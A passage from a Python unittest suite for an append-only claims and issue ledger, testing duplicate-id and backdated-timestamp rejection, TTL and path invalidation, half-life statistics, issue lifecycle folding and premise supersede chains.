        errors, _ = tm.order_check(evs)
        self.assertEqual(len(errors), 1)
        self.assertIn("duplicate id", errors[0])
        self.assertIn("ADR-031", errors[0])

    def test_equal_ts_content_distinct_duplicate_is_an_error(self):
        """The ADR-016/C1 copied-timestamp forgery, now refused by the
        unified ADR-031 rule."""
        evs = events(rec("claim", claim_p(), ts=self.T1),
                     rec("claim", claim_p(text="substitution"), ts=self.T1))
        errors, _ = tm.order_check(evs)
        self.assertEqual(len(errors), 1)
        self.assertIn("ADR-031", errors[0])

    def test_identical_union_merge_duplicate_passes(self):
        """git's union merge can duplicate an identical line (equal ts);
        first-wins under a stable sort keeps the genuine record, so this
        must not error."""
        r = rec("claim", claim_p(), ts=self.T1)
        errors, _ = tm.order_check(events(r, dict(r)))
        self.assertEqual(errors, [])

    def test_later_ts_content_distinct_duplicate_is_refused(self):
        """ADR-031 flips the pre-v0.9.13 acceptance: a later-ts duplicate
        id with different content loses to first-wins anyway (harmless to
        the fold) but has no legitimate producer -- corrections file
        under fresh ids -- so it is now refused as pure attack surface."""
        evs = events(rec("claim", claim_p(), ts=self.T1),
                     rec("claim", claim_p(text="dup"), ts=self.T2))
        errors, _ = tm.order_check(evs)
        self.assertEqual(len(errors), 1)
        self.assertIn("ADR-031", errors[0])

    def test_byte_identical_later_duplicate_still_passes(self):
        """ADR-031's only legal duplicate shape: byte-identical (the
        union-merge duplicate), wherever it lands in the file."""
        r = rec("claim", claim_p(), ts=self.T1)
        other = rec("claim", claim_p(text="unrelated"), rid="tr-00000099",
                    ts=self.T2)
        errors, _ = tm.order_check(events(r, other, dict(r)))
        self.assertEqual(errors, [])

    def test_fold_first_wins_unchanged_by_adr031(self):
        """The gate refuses; the fold is UNTOUCHED (ADR-031 non-goal):
        first-wins in (ts, id, canon) order keeps the genuine content for
        a later-ts duplicate in either file order."""
        genuine = rec("claim", claim_p(text="genuine"), ts=self.T1)
        dup = rec("claim", claim_p(text="forged"), ts=self.T2)
        for order in ((genuine, dup), (dup, genuine)):
            claims, _ = tm.fold(events(*order))
            c = claims[genuine["id"]]["claim"]
            text = c.get("text") or c.get("payload", {}).get("text")
            self.assertEqual(text, "genuine")

    def test_small_inversion_silent_large_inversion_warns(self):
        near = "2026-07-02T00:00:00+00:00"
        near_minus_10s = "2026-07-01T23:59:50+00:00"
        evs = events(rec("claim", claim_p(), rid="tr-00000001", ts=near),
                     rec("claim", claim_p(text="b"), rid="tr-00000002",
                         ts=near_minus_10s))
        _, warnings = tm.order_check(evs)
        self.assertEqual(warnings, [])
        evs = events(rec("claim", claim_p(), rid="tr-00000001", ts=self.T3),
                     rec("claim", claim_p(text="b"), rid="tr-00000002",
                         ts=self.T1))
        errors, warnings = tm.order_check(evs)
        self.assertEqual(errors, [])
        self.assertEqual(len(warnings), 1)

    def test_backdated_duplicate_with_naive_ts_is_caught(self):
        """F2/v0.6.2: a tz-naive forged ts sorts before a tz-aware
        genuine one by raw string (fold's key) but used to slip past the
        parsed comparison, which abstained on tz mismatch."""
        evs = events(rec("claim", claim_p(), ts=self.T2),
                     rec("claim", claim_p(text="sub"),
                         ts="2026-07-01T00:00:00"))  # naive, no offset
        errors, _ = tm.order_check(evs)
        self.assertEqual(len(errors), 1)
        self.assertIn("duplicate id", errors[0])

    def test_backdated_duplicate_with_junk_ts_is_caught(self):
        """F2/v0.6.2: an unparseable ts made parse_ts return None, so the
        old comparison abstained; by raw string 'z...'<ISO it still sorts
        first in the fold."""
        evs = events(rec("claim", claim_p(), ts=self.T2),
                     rec("claim", claim_p(text="sub"), ts="1"))
        errors, _ = tm.order_check(evs)
        self.assertEqual(len(errors), 1)

    def test_issue_event_before_its_issue_is_an_error(self):
        """ADR-028: an issue_event sorting BEFORE its issue record is a
        forward reference fold_issues silently drops -- the future-dated-
        issue hole. A raw honest-clock event on a 2027-dated issue record
        sorts first and must be refused at the commit gate."""
        evs = events(
            rec("issue", {"title": "future"}, rid="wk-0000f00d",
                ts="2027-06-01T00:00:00+00:00"),
            rec("issue_event", {"issue": "wk-0000f00d", "event": "closed",
                                "basis": "raw"}, rid="tr-11110001",
                ts="2026-07-19T00:00:00+00:00"))
        errors, _ = tm.order_check(evs)
        self.assertTrue(any("sorts before its issue record" in e
                            for e in errors), errors)

    def test_issue_event_after_its_issue_passes(self):
        """No false positive: the normal order (issue then event) is fine."""
        evs = events(
            rec("issue", {"title": "ok"}, rid="wk-0000aaaa",
                ts="2026-07-01T00:00:00+00:00"),
            rec("issue_event", {"issue": "wk-0000aaaa", "event": "claimed",
                                "basis": ""}, rid="tr-11110002",
                ts="2026-07-02T00:00:00+00:00"))
        errors, _ = tm.order_check(evs)
        self.assertEqual(errors, [])

# --------------------------------------------------------- stats (FS-1)

class TestStats(unittest.TestCase):
    def _world(self):
        return events(
            rec("claim", claim_p(cost_tier="P1"), rid="tr-000000a1",
                ts="2026-07-01T00:00:00+00:00"),
            rec("verdict", {"claim": "tr-000000a1", "verdict": "agree",
                            "basis": "b"}, rid="tr-000000a2",
                ts="2026-07-01T00:00:00+00:00"),
            rec("invalidation", {"claim": "tr-000000a1", "commit": "c",
                                 "reason": "r"}, rid="tr-000000a3",
                ts="2026-07-05T00:00:00+00:00"))

    def test_half_life_measured_live_to_stale(self):
        obs, _ = tm.half_life_observations(self._world())
        self.assertEqual(obs, [("P1", 4.0)])

    def test_half_life_replay_matches_fold(self):
        """The mini-replay must never disagree with fold() on final
        status -- fold stays authoritative; this is the drift guard."""
        evs = self._world() + events(
            rec("claim", claim_p(text="second"), rid="tr-000000b1",
                ts="2026-07-02T00:00:00+00:00"),
            rec("verdict", {"claim": "tr-000000b1", "verdict": "retracted",
                            "basis": "b"}, rid="tr-000000b2",
                ts="2026-07-03T00:00:00+00:00"))
        evs = list(enumerate([e for _, e in evs], 1))
        _, replay_status = tm.half_life_observations(evs)
        claims, _ = tm.fold(evs)
        self.assertEqual(replay_status,
                         {cid: e["status"] for cid, e in claims.items()})

    def test_stats_report_splits_mechanical(self):
        evs = self._world() + events(
            rec("verdict", {"claim": "tr-000000a1", "verdict": "diverge",
                            "basis": "b", "subtype": "mechanical"},
                rid="tr-000000c1", ts="2026-07-06T00:00:00+00:00"))
        evs = list(enumerate([e for _, e in evs], 1))
        report = tm.stats_report(evs, NOW)
        self.assertEqual(report["verdicts"]["diverge_mechanical"], 1)
        self.assertEqual(report["verdicts"]["diverge_genuine"], 0)
        self.assertEqual(report["half_life"]["P1"]["median_days"], 4.0)

    def test_ttl_suggestion_threshold(self):
        few = [("P1", 3.0)] * (tm.HALF_LIFE_MIN_OBS - 1)
        self.assertIsNone(tm.ttl_suggestion(few, "P1"))
        enough = [("P1", 3.0)] * tm.HALF_LIFE_MIN_OBS
        self.assertEqual(tm.ttl_suggestion(enough, "P1"), 3.0)
        self.assertIsNone(tm.ttl_suggestion(enough, "P0"))

    # ---- FS-1/ADR-032: TTL expiries must not feed the half-life medians
    def _cycle(self, cid, rv, ri, tier, reason=None, reason_code=None):
        """A claim that goes live (agree) at 07-01 then stale
        (invalidation) at 07-05 -- 4.0 days of observed live-time."""
        p = {"claim": cid, "commit": "c"}
        if reason is not None:
            p["reason"] = reason
        if reason_code is not None:
            p["reason_code"] = reason_code
        return [
            rec("claim", claim_p(cost_tier=tier), rid=cid,
                ts="2026-07-01T00:00:00+00:00"),
            rec("verdict", {"claim": cid, "verdict": "agree", "basis": "b"},
                rid=rv, ts="2026-07-01T00:00:00+00:00"),
            rec("invalidation", p, rid=ri, ts="2026-07-05T00:00:00+00:00")]

    def test_ttl_expiry_excluded_but_path_invalidation_kept(self):
        """N ttl-reason expiries + M path invalidations -> exactly M
        observations. TTL expiry is administratively caused, not drift."""
        raw = (
            self._cycle("tr-000000p1", "tr-000000p2", "tr-000000p3", "P1",
                        reason="path f.txt changed")
            + self._cycle("tr-000000q1", "tr-000000q2", "tr-000000q3", "P1",
                          reason="path g.txt changed")
            + self._cycle("tr-000000t1", "tr-000000t2", "tr-000000t3", "P1",
                          reason="ttl expired (30 days)", reason_code="ttl")
            + self._cycle("tr-000000u1", "tr-000000u2", "tr-000000u3", "P1",
                          reason="ttl expired (30 days)", reason_code="ttl")
            + self._cycle("tr-000000w1", "tr-000000w2", "tr-000000w3", "P1",
                          reason="ttl expired (30 days)", reason_code="ttl"))
        obs, _ = tm.half_life_observations(events(*raw))
        self.assertEqual(obs, [("P1", 4.0), ("P1", 4.0)])

    def test_ttl_expiry_excluded_via_prefix_fallback_without_reason_code(self):
        """Pre-stamp record: reason prefix 'ttl expired ...' with NO
        reason_code is still excluded (the is_ttl_reason fallback arm)."""
        raw = (
            self._cycle("tr-000000a1", "tr-000000a2", "tr-000000a3", "P1",
                        reason="ttl expired (30 days)")  # no reason_code
            + self._cycle("tr-000000b1", "tr-000000b2", "tr-000000b3", "P1",
                          reason="path f.txt changed"))
        obs, _ = tm.half_life_observations(events(*raw))
        self.assertEqual(obs, [("P1", 4.0)])  # only the path invalidation

    def test_ttl_suggestion_none_over_only_ttl_expiries(self):
        """A stream of only ttl expiries (well past HALF_LIFE_MIN_OBS)
        yields no observations, so ttl_suggestion returns None -- the
        circularity that would suggest ~= the default is broken."""
        raw = []
        for i in range(tm.HALF_LIFE_MIN_OBS + 1):
            b = "tr-0000t%03d" % i
            raw += self._cycle(b + "c", b + "v", b + "i", "P1",
                               reason="ttl expired (30 days)",
                               reason_code="ttl")
        obs, _ = tm.half_life_observations(events(*raw))
        self.assertEqual([d for t, d in obs if t == "P1"], [])
        self.assertIsNone(tm.ttl_suggestion(obs, "P1"))

class TestMechanicalSubtypeFold(unittest.TestCase):
    def test_subtype_surfaces_in_queue(self):
        evs = events(
            rec("claim", claim_p(cost_tier="P1")),
            rec("verdict", {"claim": "tr-00000001", "verdict": "diverge",
                            "basis": "b", "subtype": "mechanical"},
                rid="tr-00000002", ts="2026-07-02T00:00:00+00:00"))
        claims, _ = tm.fold(evs)
        self.assertEqual(claims["tr-00000001"]["subtype"], "mechanical")
        rows = tm.queue_rows(claims, NOW)
        self.assertIn("mechanical", rows[0]["reason"])

# ---------------------------------------------------- recheck decisions

class TestRecheck(unittest.TestCase):
    EV = {"command": "cat f", "output_hash": "sha256:" + "a" * 64, "returncode": 0}

    def test_match_agrees(self):
        v, _ = tm.recheck_verdict(self.EV, "a" * 64, 0)
        self.assertEqual(v, "agree")

    def test_mismatch_diverges(self):
        v, basis = tm.recheck_verdict(self.EV, "b" * 64, 0)
        self.assertEqual(v, "diverge")
        self.assertIn("MISMATCH", basis)

    def test_returncode_mismatch_diverges(self):
        v, _ = tm.recheck_verdict(self.EV, "a" * 64, 1)
        self.assertEqual(v, "diverge")

    def test_127_is_cannot_verify(self):
        v, basis = tm.recheck_verdict(self.EV, "whatever", 127)
        self.assertEqual(v, "cannot_verify")
        self.assertIn("127", basis)

# ------------------------------------------------ invalidation strategies

def entry(payload, status="live", ts=TS):
    return {"status": status, "status_ts": ts,
            "claim": rec("claim", payload, ts=ts)}

class TestInvalidation(unittest.TestCase):
    def test_ttl_expired(self):
        e = entry(claim_p(ttl_days=1))
        d = tm.decide_invalidation(e, {"head": "h"}, NOW)  # NOW is 4 days later
        self.assertEqual(d["label"], "ttl expired")
        self.assertIn("ttl expired (1 days)", d["payload"]["reason"])

    def test_ttl_not_yet(self):
        e = entry(claim_p(ttl_days=30))
        self.assertIsNone(tm.decide_invalidation(e, {"head": "h"}, NOW))

    def test_ttl_boundary_is_strict_from_claim_ts(self):
        """ADR-019 (H2): expiry counts from the claim's own ts with a
        STRICT boundary -- at exactly ts + ttl_days it survives; one unit
        past, it expires. And the reference instant is per-claim ts, not a
        fixed epoch, so a later-dated claim with the same ttl is not yet
        expired at the same `now`."""
        claim_dt = tm.parse_ts(TS)                       # 2026-07-01T00:00:00Z
        exact = claim_dt + timedelta(days=4)             # ts + ttl_days
        just_after = exact + timedelta(seconds=1)
        e = entry(claim_p(ttl_days=4), ts=TS)
        self.assertIsNone(                               # strict >: boundary survives
            tm.decide_invalidation(e, {"head": "h"}, exact))
        d = tm.decide_invalidation(e, {"head": "h"}, just_after)
        self.assertEqual(d["label"], "ttl expired")      # one second past: expired
        later = entry(claim_p(ttl_days=4),
                      ts="2026-07-02T00:00:00.000000+00:00")
        self.assertIsNone(                               # counted from ITS ts, not a global clock
            tm.decide_invalidation(later, {"head": "h"}, just_after))

    def test_fold_never_synthesizes_ttl_expiry(self):
        """ADR-019 (H2): the fold reads no clock. A TTL'd claim with no
        invalidation record folds non-stale however old -- only the scan
        (the sole clock reader) emits the record that demotes it. Guards
        against a future edit that makes the fold expire from wall-time
        (which would destroy purity/confluence, INV-I)."""
        old = "2020-01-01T00:00:00.000000+00:00"         # 6+ years before NOW
        claims, _ = tm.fold(events(rec("claim", claim_p(ttl_days=1), ts=old)))
        self.assertEqual(claims["tr-00000001"]["status"], "unverified")

    def test_anchor_unreachable(self):
        e = entry(verified_p())
        d = tm.decide_invalidation(e, {"head": "h", "anchor_reachable": False}, NOW)
        self.assertEqual(d["label"], "anchor unreachable")
        self.assertIn("anchor unreachable", d["payload"]["reason"])

    def test_paths_touched(self):
        e = entry(verified_p())
        d = tm.decide_invalidation(
            e, {"head": "h", "anchor_reachable": True,
                "changed_files": ["f.txt", "other.py"], "diff_error": None}, NOW)
        self.assertEqual(d["label"], "paths changed")
        self.assertEqual(d["payload"]["touched"], ["f.txt"])

    def test_untouched_paths_no_decision(self):
        e = entry(verified_p())
        self.assertIsNone(tm.decide_invalidation(
            e, {"head": "h", "anchor_reachable": True,
                "changed_files": ["other.py"], "diff_error": None}, NOW))

    def test_empty_glob_is_dormant_not_dead(self):
        """ADR-023 (H5): a glob matching zero tracked files at filing time
        is EXEMPT from the intake dead-literal gate, and -- the crux --
        still FIRES once its namespace fills, because the invalidator
        re-evaluates the pattern against each scan's diff rather than
        freezing its matches at filing time. So an empty glob is *dormant*,
        not dead; the finding that 'an empty glob can never fire' is
        refuted right here."""
        glob = "src/ghost/*.py"
        # (1) intake exempts the zero-match glob -- it has no single referent
        self.assertEqual(tm.dead_literal_paths([glob], []), [])
        e = entry(verified_p(evidence_paths=[glob]))
        # (2) dormant while the namespace stays empty: an unrelated change misses
        self.assertIsNone(tm.decide_invalidation(
            e, {"head": "h", "anchor_reachable": True,
                "changed_files": ["src/other/x.py"], "diff_error": None}, NOW))
        # (3) fires the moment a matching file is created and diffed
        d = tm.decide_invalidation(
            e, {"head": "h", "anchor_reachable": True,
                "changed_files": ["src/ghost/appeared.py"], "diff_error": None}, NOW)
        self.assertEqual(d["label"], "paths changed")
        self.assertEqual(d["payload"]["touched"], ["src/ghost/appeared.py"])

    def test_diff_error_fails_toward_distrust(self):
        e = entry(verified_p())
        d = tm.decide_invalidation(
            e, {"head": "h", "anchor_reachable": True,
                "changed_files": None, "diff_error": "boom"}, NOW)
        self.assertEqual(d["label"], "diff failed")

    def test_facts_not_gathered_means_abstain(self):
        e = entry(verified_p())
        self.assertIsNone(tm.decide_invalidation(e, {"head": "h"}, NOW))

    def test_ttl_precedes_paths(self):
        e = entry(verified_p(ttl_days=1))
        d = tm.decide_invalidation(
            e, {"head": "h", "anchor_reachable": True,
                "changed_files": ["f.txt"], "diff_error": None}, NOW)
        self.assertEqual(d["label"], "ttl expired")

    def test_terminal_and_settled_states_skipped(self):
        for status in ("stale", "diverged", "retracted", "cannot_verify"):
            e = entry(verified_p(ttl_days=1), status=status)
            self.assertIsNone(tm.decide_invalidation(e, {"head": "h"}, NOW), status)

# --------------------------------------------------------- consumers

class TestQueue(unittest.TestCase):
    def make(self, status, tier):
        return {"tr-0000000c": entry(claim_p(cost_tier=tier), status=status)}

    def test_membership(self):
        cases = [("diverged", "P2", True), ("stale", "P0", True),
                 ("stale", "P1", True), ("stale", "P2", False),
                 ("cannot_verify", "P0", True), ("cannot_verify", "P1", False),
                 ("live", "P0", False), ("retracted", "P0", False)]
        for status, tier, expect in cases:
            rows = tm.queue_rows(self.make(status, tier), NOW)
            self.assertEqual(bool(rows), expect, (status, tier))

    def test_age_days_uses_injected_now(self):
        rows = tm.queue_rows(self.make("diverged", "P1"), NOW)
        self.assertEqual(rows[0]["age_days"], 4)  # TS -> NOW

class TestJoinReady(unittest.TestCase):
    def setUp(self):
        self.claims = {
            "tr-000000aa": entry(claim_p(cost_tier="P1"), status="live"),
            "tr-000000bb": entry(claim_p(cost_tier="P1"), status="stale"),
            "tr-000000cc": entry(claim_p(cost_tier="P0"), status="cannot_verify"),
            "tr-000000dd": entry(claim_p(cost_tier="P1"), status="unverified"),
        }

    def go(self, premises):
        issues = [{"id": "bd-x1", "title": "t"}]
        return tm.join_ready(issues, self.claims, premises)

    def test_live_passes(self):
        ready, _ = self.go({"bd-x1": ["tr-000000aa"]})
        self.assertEqual(len(ready), 1)
        self.assertEqual(ready[0]["_truth"]["warnings"], [])

    def test_unverified_passes_with_warning(self):
        ready, _ = self.go({"bd-x1": ["tr-000000dd"]})
        self.assertEqual(len(ready), 1)
        self.assertTrue(ready[0]["_truth"]["warnings"])

    def test_stale_blocks(self):
        ready, annotated = self.go({"bd-x1": ["tr-000000bb"]})
        self.assertEqual(ready, [])
        self.assertIn("tr-000000bb (stale)",
                      annotated[0]["_truth"]["broken_premises"])

    def test_cannot_verify_p0_blocks(self):
        ready, _ = self.go({"bd-x1": ["tr-000000cc"]})
        self.assertEqual(ready, [])

    def test_missing_blocks(self):
        ready, annotated = self.go({"bd-x1": ["tr-000000ff"]})
        self.assertEqual(ready, [])
        self.assertIn("tr-000000ff (missing)",
                      annotated[0]["_truth"]["broken_premises"])

    def test_no_premises_passes(self):
        ready, _ = self.go({})
        self.assertEqual(len(ready), 1)

class TestDispatch(unittest.TestCase):
    def test_header_stripped_claim_appended(self):
        prompt = "human header\n---\nVERIFIER BODY\n\n1. RULE ONE.\n2. RULE TWO.\n"
        out = tm.dispatch_text(prompt, rec("claim", claim_p()))
        self.assertNotIn("human header", out)
        self.assertIn("VERIFIER BODY", out)
        self.assertIn("CLAIM RECORD", out)
        self.assertIn('"tr-00000001"', out)

    def test_envelope_self_describes_integrity(self):
        # TL-3: transports can lossily compress the dispatch; a complete
        # copy must be distinguishable from a truncated one by its reader.
        import hashlib as _h
        prompt = "human header\n---\nVERIFIER BODY\n\n1. RULE ONE.\n2. RULE TWO.\n"
        out = tm.dispatch_text(prompt, rec("claim", claim_p()))
        digest = _h.sha256(prompt.encode("utf-8")).hexdigest()
        self.assertTrue(out.startswith("INTEGRITY (check before following)"))
        self.assertIn("contains 2 numbered rules", out)
        self.assertTrue(out.endswith(f"END-OF-DISPATCH sha256:{digest}"))
        # claim record sits INSIDE the envelope, so record truncation is
        # also caught by a missing terminator
        self.assertLess(out.index("CLAIM RECORD"), out.rindex("END-OF-DISPATCH"))

# ------------------------------------------------ work kernel (ADR-002)

def issue_rec(rid="wk-00000001", ts=TS, **over):
    p = {"title": "do the thing", "text": "", "deps": [], "premises": []}
    p.update(over)
    return rec("issue", p, rid=rid, ts=ts)

def issue_ev(event, ref="wk-00000001", ts=TS, rid="tr-000000e1", basis="b"):
    return rec("issue_event", {"issue": ref, "event": event, "basis": basis},
               rid=rid, ts=ts)

class TestFoldIssues(unittest.TestCase):
    def test_new_issue_is_open(self):
        issues = tm.fold_issues(events(issue_rec()))
        self.assertEqual(issues["wk-00000001"]["status"], "open")

    def test_lifecycle_open_claimed_closed_reopened(self):
        evs = events(
            issue_rec(ts="2026-07-01T00:00:00+00:00"),
            issue_ev("claimed", ts="2026-07-01T00:00:01+00:00", rid="tr-000000e1"),
            issue_ev("closed", ts="2026-07-01T00:00:02+00:00", rid="tr-000000e2"),
            issue_ev("reopened", ts="2026-07-01T00:00:03+00:00", rid="tr-000000e3"))
        for cut, want in ((1, "open"), (2, "claimed"), (3, "closed"), (4, "open")):
            issues = tm.fold_issues(evs[:cut])
            self.assertEqual(issues["wk-00000001"]["status"], want)

    def test_cancelled_is_terminal(self):
        evs = events(
            issue_rec(ts="2026-07-01T00:00:00+00:00"),
            issue_ev("cancelled", ts="2026-07-01T00:00:01+00:00", rid="tr-000000e1"),
            issue_ev("reopened", ts="2026-07-01T00:00:02+00:00", rid="tr-000000e2"),
            issue_ev("claimed", ts="2026-07-01T00:00:03+00:00", rid="tr-000000e3"))
        issues = tm.fold_issues(evs)
        self.assertEqual(issues["wk-00000001"]["status"], "cancelled")

    def test_first_issue_payload_wins(self):
        """ADR-006: matches fold()'s claim handling -- a duplicate wk- id
        cannot alter the issue's title, deps, or premises, no matter its
        timestamp."""
        evs = events(
            issue_rec(title="v1", ts="2026-07-01T00:00:00+00:00"),
            issue_rec(title="v2", ts="2026-07-01T00:00:05+00:00"))
        issues = tm.fold_issues(evs)
        self.assertEqual(issues["wk-00000001"]["issue"]["payload"]["title"], "v1")

    def test_duplicate_issue_id_cannot_strip_premises(self):
        """ADR-006: the finding this fix closes -- a later-timestamped
        duplicate wk- id emptying `premises` must not disarm ADR-001
        protection. No backdating needed for this attack (last-wins would
        have let an ordinary 'now' timestamp win), which is exactly why
        last-wins was the wrong default."""
        evs = events(
            issue_rec(premises=["tr-000000c1"], ts="2026-07-01T00:00:00+00:00"),
            issue_rec(premises=[], ts="2099-01-01T00:00:00+00:00"))
        issues = tm.fold_issues(evs)
        self.assertEqual(
            issues["wk-00000001"]["issue"]["payload"]["premises"],
            ["tr-000000c1"])

    def test_confluence_all_permutations_with_duplicate_id(self):
        """v0.5.6: coverage symmetry with the claims fold — first-wins
        under a duplicate wk- id must be confluent across every arrival
        order, not just the two fixed orders the ADR-006 tests exercise."""
        import itertools
        evs = [issue_rec(premises=["tr-000000c1"],
                         ts="2026-07-01T00:00:00+00:00"),
               issue_rec(premises=[], title="forged",
                         ts="2099-01-01T00:00:00+00:00"),
               issue_ev("claimed", ts="2026-07-02T00:00:00+00:00")]
        states = set()
        for perm in itertools.permutations(evs):
            issues = tm.fold_issues(list(enumerate(perm, 1)))
            e = issues["wk-00000001"]
            states.add((e["status"],
                        tuple(e["issue"]["payload"]["premises"]),
                        e["issue"]["payload"]["title"]))
        self.assertEqual(states,
                         {("claimed", ("tr-000000c1",), "do the thing")})

    def test_confluence_file_order_irrelevant(self):
        a = issue_rec(ts="2026-07-01T00:00:00+00:00")
        b = issue_ev("claimed", ts="2026-07-01T00:00:01+00:00", rid="tr-000000e1")
        c = issue_ev("closed", ts="2026-07-01T00:00:02+00:00", rid="tr-000000e2")
        fwd = tm.fold_issues(events(a, b, c))
        rev = tm.fold_issues(events(c, b, a))
        self.assertEqual(fwd["wk-00000001"]["status"],
                         rev["wk-00000001"]["status"])

    def test_event_for_unknown_issue_ignored(self):
        issues = tm.fold_issues(events(issue_ev("closed", ref="wk-deadbeef")))
        self.assertEqual(issues, {})

class TestIssueEventError(unittest.TestCase):
    def test_transition_matrix(self):
        ok = [("open", "claimed"), ("claimed", "released"), ("open", "closed"),
              ("claimed", "closed"), ("closed", "reopened"),
              ("open", "cancelled"), ("claimed", "cancelled"),
              ("closed", "cancelled")]
        bad = [("closed", "claimed"), ("open", "released"), ("open", "reopened"),
               ("closed", "closed"), ("cancelled", "reopened"),
               ("cancelled", "closed"), ("cancelled", "claimed")]
        for st, ev in ok:
            self.assertIsNone(tm.issue_event_error(st, ev), f"{st}->{ev}")
        for st, ev in bad:
            self.assertIsNotNone(tm.issue_event_error(st, ev), f"{st}->{ev}")

    def test_future_dated_issue_refused_at_intake(self):
        """ADR-028: acting on an issue whose record is dated beyond skew in
        the future is refused -- an event filed now would sort before it and
        the fold would drop it. NOW is the core's fixed clock (12:00)."""
        future = {"id": "wk-00000001", "ts": "2027-06-01T00:00:00.000000+00:00"}
        self.assertIsNotNone(tm.issue_event_ts_error(future, NOW))
        present = {"id": "wk-00000002", "ts": "2026-07-05T11:59:00.000000+00:00"}
        self.assertIsNone(tm.issue_event_ts_error(present, NOW))

class TestNativeReady(unittest.TestCase):
    def _issues(self, *evs):
        return tm.fold_issues(events(*evs))

    def test_open_no_deps_is_ready(self):
        ready = tm.native_ready_issues(self._issues(issue_rec()))
        self.assertEqual(ready, [{"id": "wk-00000001", "title": "do the thing"}])

    def test_claimed_not_ready(self):
        issues = self._issues(issue_rec(), issue_ev("claimed",
                              ts="2026-07-01T00:00:01+00:00"))
        self.assertEqual(tm.native_ready_issues(issues), [])

    def test_dep_gates_until_closed(self):
        dep = issue_rec(rid="wk-000000aa", ts="2026-07-01T00:00:00+00:00")
        top = issue_rec(rid="wk-000000bb", deps=["wk-000000aa"],
                        ts="2026-07-01T00:00:00+00:00")
        blocked = self._issues(dep, top)
        self.assertNotIn("wk-000000bb",
                         [i["id"] for i in tm.native_ready_issues(blocked)])
        unblocked = self._issues(dep, top,
                                 issue_ev("closed", ref="wk-000000aa",
                                          ts="2026-07-01T00:00:01+00:00"))
        self.assertIn("wk-000000bb",
                      [i["id"] for i in tm.native_ready_issues(unblocked)])

    def test_cancelled_or_unknown_dep_blocks_forever(self):
        dep = issue_rec(rid="wk-000000aa", ts="2026-07-01T00:00:00+00:00")
        top = issue_rec(rid="wk-000000bb", deps=["wk-000000aa"],
                        ts="2026-07-01T00:00:00+00:00")
        cancelled = self._issues(dep, top,
                                 issue_ev("cancelled", ref="wk-000000aa",
                                          ts="2026-07-01T00:00:01+00:00"))
        self.assertNotIn("wk-000000bb",
                         [i["id"] for i in tm.native_ready_issues(cancelled)])
        ghost = self._issues(issue_rec(rid="wk-000000bb", deps=["wk-00ghost0"]))
        self.assertEqual(tm.native_ready_issues(ghost), [])

class TestIssuePremiseMerge(unittest.TestCase):
    def test_premise_at_birth_collected_and_merged(self):
        issues = tm.fold_issues(events(issue_rec(premises=["tr-000000c1"])))
        born = tm.issue_premises(issues)
        self.assertEqual(born, {"wk-00000001": ["tr-000000c1"]})
        merged = tm.merge_premises({"wk-00000001": ["tr-000000c2"],
                                    "bd-x1": ["tr-000000c3"]}, born)
        self.assertEqual(merged["wk-00000001"], ["tr-000000c2", "tr-000000c1"])
        self.assertEqual(merged["bd-x1"], ["tr-000000c3"])

    def test_merge_deduplicates(self):
        merged = tm.merge_premises({"w": ["tr-000000c1"]},
                                   {"w": ["tr-000000c1"]})
        self.assertEqual(merged["w"], ["tr-000000c1"])

# --------------------------------------------- premise supersede (ADR-013)

class TestSupersedes(unittest.TestCase):
    def _redirect(self, issue, old, new, ts):
        return rec("premise", {"issue": issue, "claim": new,
                               "supersedes": old}, ts=ts)

    def test_redirect_rewrites_merged_premises(self):
        supers = tm.fold_supersedes(events(
            self._redirect("wk-00000001", "tr-000000d1", "tr-000000d2",
                           "2026-07-01T00:00:00+00:00")))
        out = tm.apply_supersedes({"wk-00000001": ["tr-000000d1"]}, supers)
        self.assertEqual(out, {"wk-00000001": ["tr-000000d2"]})

    def test_redirect_scoped_to_one_issue(self):
        supers = tm.fold_supersedes(events(
            self._redirect("wk-00000001", "tr-000000d1", "tr-000000d2",
                           "2026-07-01T00:00:00+00:00")))
        out = tm.apply_supersedes({"wk-00000001": ["tr-000000d1"],
                                   "wk-00000002": ["tr-000000d1"]}, supers)
        self.assertEqual(out["wk-00000001"], ["tr-000000d2"])
        self.assertEqual(out["wk-00000002"], ["tr-000000d1"])

    def test_chain_follows_to_fixed_point_and_dedupes(self):
        supers = tm.fold_supersedes(events(
            self._redirect("w", "tr-000000d1", "tr-000000d2",
                           "2026-07-01T00:00:00+00:00"),
            self._redirect("w", "tr-000000d2", "tr-000000d3",
                           "2026-07-01T01:00:00+00:00")))
        out = tm.apply_supersedes({"w": ["tr-000000d1", "tr-000000d3"]},
                                  supers)
        self.assertEqual(out["w"], ["tr-000000d3"])

    def test_cycle_stops_at_first_repeat(self):
        supers = tm.fold_supersedes(events(
            self._redirect("w", "tr-000000d1", "tr-000000d2",
                           "2026-07-01T00:00:00+00:00"),
            self._redirect("w", "tr-000000d2", "tr-000000d1",
                           "2026-07-01T01:00:00+00:00")))
        out = tm.apply_supersedes({"w": ["tr-000000d1"]}, supers)
        # ADR-013 clarified (HIGH-2): a 2-cycle a->b->a entered at a
        # resolves back to a -- a deterministic no-op, not an escape
        self.assertEqual(out["w"], ["tr-000000d1"])

    def test_chain_into_cycle_resolves_to_entry_point(self):
        # ADR-013 clarified (HIGH-2): the effective premise on a cycle is
        # the FIRST REPEATED value, which for a chain into a cycle is the
        # cycle's entry point, not the chain's start. P->Q->R->Q from P
        # resolves to Q. This is the case the prose omitted and the
        # 2-cycle test alone did not distinguish.
        supers = tm.fold_supersedes(events(
            self._redirect("w", "tr-000000dP", "tr-000000dQ",
                           "2026-07-01T00:00:00+00:00"),
            self._redirect("w", "tr-000000dQ", "tr-000000dR",
                           "2026-07-01T01:00:00+00:00"),
            self._redirect("w", "tr-000000dR", "tr-000000dQ",
                           "2026-07-01T02:00:00+00:00")))
        out = tm.apply_supersedes({"w": ["tr-000000dP"]}, supers)
        self.assertEqual(out["w"], ["tr-000000dQ"])

    def test_last_wins_confluent_under_permutation(self):
        e1 = self._redirect("w", "tr-000000d1", "tr-000000d2",
                            "2026-07-01T00:00:00+00:00")
        e2 = self._redirect("w", "tr-000000d1", "tr-000000d3",
                            "2026-07-01T01:00:00+00:00")
        for order in ((e1, e2), (e2, e1)):
            supers = tm.fold_supersedes(events(*order))
            self.assertEqual(supers[("w", "tr-000000d1")], "tr-000000d3")

    def test_no_redirects_is_identity(self):
        prem = {"w": ["tr-000000d1"]}
        self.assertEqual(tm.apply_supersedes(prem, {}), prem)

# ------------------------------------------------- impact query (ADR-005)

class TestImpact(unittest.TestCase):
    def _world(self):
        evs = events(
            rec("claim", verified_p(evidence_paths=["src/**"]),
                rid="tr-000000a1"),
            rec("verdict", {"claim": "tr-000000a1", "verdict": "agree",
                            "basis": "b"}, rid="tr-000000a2",
